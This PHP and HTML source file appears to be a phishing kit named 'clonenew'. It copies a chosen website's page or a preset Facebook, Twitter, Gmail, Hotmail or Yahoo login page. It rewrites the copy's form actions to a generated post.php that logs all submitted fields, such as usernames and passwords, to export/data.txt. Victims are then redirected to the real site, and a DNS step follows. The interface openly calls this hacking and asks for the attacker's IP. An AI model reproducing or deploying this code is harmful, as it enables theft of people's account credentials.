<?php


clearstatcache();


   $ip_redirection = shell_exec('shell/./my_ipv4.sh');
  
    require_once('__SRC__/class_redirection.php');

   
   if (class_exists('REDIRECTION_URL_FORCE')) 
    {

    $obj_redirection =  new REDIRECTION_URL_FORCE;    
  

  if ($obj_redirection -> LOCAL_IP[0] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }

   else if ($obj_redirection -> LOCAL_IP[1] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }



  else if ($obj_redirection -> LOCAL_IP[2] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
    }



   else  if ($obj_redirection -> LOCAL_IP[3] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }

   
    
   else
    {    

   error_reporting(0);

   error_reporting(E_ERROR | E_WARNING | E_PARSE);

   error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);

   error_reporting(E_ALL & ~E_NOTICE);

   error_reporting(E_ALL);

   error_reporting(-1);

   ini_set('error_reporting', E_ALL);

   ini_set("display_errors", 1);

      }


   }// end of class REDIRECTION_URL_FORCE exists


?>


<html>
<head>

   <title> clonenew </title>
  
  <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />

 <link rel="stylesheet" type="text/css" href="css/index.css">
 
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />

</head>


<body id="body">



 <script type="text/javascript">
$(document).ready(function(){    
    //Check if the current URL contains '#'
    if(document.URL.indexOf("#")==-1){
        // Set the URL to whatever it was plus "#".
        url = document.URL+"#";
        location = "#";

        //Reload the page
        location.reload(true);
    }
});
</script>




    <div class="shell-wrap">
  <p class="shell-top-bar"> Instructions for use </p>
  
     <br>

   <div align="center">
      <font color="black">
      1) insert a name of a web site and press enter <br>
      2) The web site it must have http or https protocol <br>
       Right: http://www.example.com or http://example.com <br>
       Wrong: www.example.com or example.com <br>
         </font>
    </div>
  
  <br><br>

  <div align="center">
 <form action="" method="post" id="form1">
  <!--  <font color="black"> <h2> Hack http web sites </h2> </font> -->
  
  <font color="black">  < </font>
     <input type="text" name="ip_addr" id="ip" minlength="7" maxlength="15" placeholder="Ip address of attacker"  autofocus required> 
      <font color="black"> > </font>
      <br><br>
      <font color="black"> < </font> 
 <input type="text" name="site_hack" minlength="3" maxlength="50" placeholder="Enter a web site ec: http://www.website.com"  
   id="site" required>  
        <font color="black"> > </font>
      <br> 
     <br>
   <input type="submit" name="hack" value="Hach this site" id="submit"> 
  </form>
    </div>


     <div align="center"> 
      <h3> <font color="black"> Or she used a ready </font> </h3>
     </div>


         <br>



      <div align="center">
    <form method="post" action="">
   <select name="site_ready" id="select_site" onchange="this.form.submit()">
    <option selected disabled> Ready websites </option>
     <optgroup label="Social Media">
    <option value ="https://www.facebook.com"> Facebook </option>
    <option value ="https://www.twitter.com"> Twitter </option>
      </optgroup>

     <option disabled> </option>

       <optgroup label="Email">
    <option value ="https://www.gmail.com"> Gmail </option>
    <option value ="https://login.live.com"> Hotmail </option>
    <option value ="https://www.yahoo.com"> Yahoo </option>
      </optgroup>
  </select>
  </form>
    </div>


  
    

  <div id="footer">
   <img src="/css/clone_diagram.jpg" height="250" width="600">
   </div>
   



</body>



</html>



<?php

  session_start();


  require_once('__SRC__/class_tools.php');

  if (class_exists('INPUT_DATA_AVAILABLE')) 
    {
    $obj_data = new INPUT_DATA_AVAILABLE;
      






  if(isset($_POST['hack']))
      {
    
  $ip_addr   = $obj_data-> SAFE_DATA_ENTER($_POST['ip_addr']);
  $site_hack = $obj_data-> SAFE_DATA_ENTER($_POST['site_hack']);


   if (filter_var($ip_addr, FILTER_VALIDATE_IP) == true) 
       {

    $get_ip = shell_exec('./my_ipv4.sh');
 
     if ($get_ip = $ip_addr)
       {


      $_SESSION['site_hack']=$site_hack;
 

     $site_name = "index"; 
    //substr(strrchr($site_hack, "/"), 1);

     $url    = $site_hack;
     $name   = $site_name.'.html';
     $file   = file($url);
     $result = file_put_contents($name, $file);





    $post_data_txt = fopen("export/data.txt", "w") or die("Unable to open file!");
    $lines_data_txt = PHP_EOL;
    fwrite($post_data_txt, $lines_data_txt);
    fclose($post_data_txt);

 
     chmod("/var/www/clonenew/export/data.txt", 0777);




    $post_file_php = fopen("post.php", "w") or die("Unable to open file!");
    $lines_php = '<?php $file = "export/data.txt";' .PHP_EOL
      .'file_put_contents($file, print_r($_POST, true), FILE_APPEND);' .PHP_EOL
      .'?>'
      .PHP_EOL
      ."<meta http-equiv='refresh' content='0; url=$site_hack'/>";
    fwrite($post_file_php, $lines_php);
    fclose($post_file_php);


      chmod("/var/www/clonenew/post.php", 0777);




      chmod("/var/www/clonenew/index.html", 0777);


  $path_to_file = 'index.html';
  $file_contents = file_get_contents($path_to_file);
  $file_contents = str_replace('action="','action="post.php" " ',$file_contents);
  file_put_contents($path_to_file,$file_contents);


  echo '<script type="text/javascript">alert("The website hack successfully");
         </script>';
          echo ("<script>location.href='dns.php'</script>");

          } // end of parity ip


          else if ($get_ip != $ip_addr)
            { 
         echo '<script type="text/javascript">alert("Ipv4 it does not fit");
         </script>';
              }


         }// end of filter validate ip


   else if (filter_var($ip_addr, FILTER_VALIDATE_IP) != true)
     {
echo '<script type="text/javascript">alert("The website hack fail: Try again");
         </script>';
     echo ("<script>location.href='index.php'</script>");
      }   



 } // kleisimo ths isset










  // isset for ready web sites

 else if(isset($_POST['site_ready']))
   {

    $site_ready = $obj_data-> SAFE_DATA_ENTER($_POST['site_ready']);


      $_SESSION['site_ready'] = $site_ready; 
  

      $post_data_txt_site_ready = fopen("export/data.txt", "w");
      chmod("/var/www/clonenew/export/data.txt", 0777);


    if ($site_ready=='https://www.facebook.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./facebook.sh');



    echo '<script type="text/javascript">alert("Facebook hack successfully");
      </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of facebook




     else if ($site_ready=='https://www.twitter.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./twitter.sh');



    echo '<script type="text/javascript">alert("Twitter hack successfully");
      </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of twitter





     else if ($site_ready=='https://www.gmail.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./gmail.sh');



    echo '<script type="text/javascript">alert("Gmail hack successfully");
      </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of gmail




      else if ($site_ready=='https://login.live.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./hotmail.sh');



    echo '<script type="text/javascript">alert("Hotmail hack successfully");
      </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of hotmail






        if ($site_ready=='https://www.yahoo.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./yahoo.sh');



    echo '<script type="text/javascript">alert("Yahoo hack successfully");
      </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of yahoo





    } // end of else if isset for ready web sites


  

  } // end of if exists class tools


?>
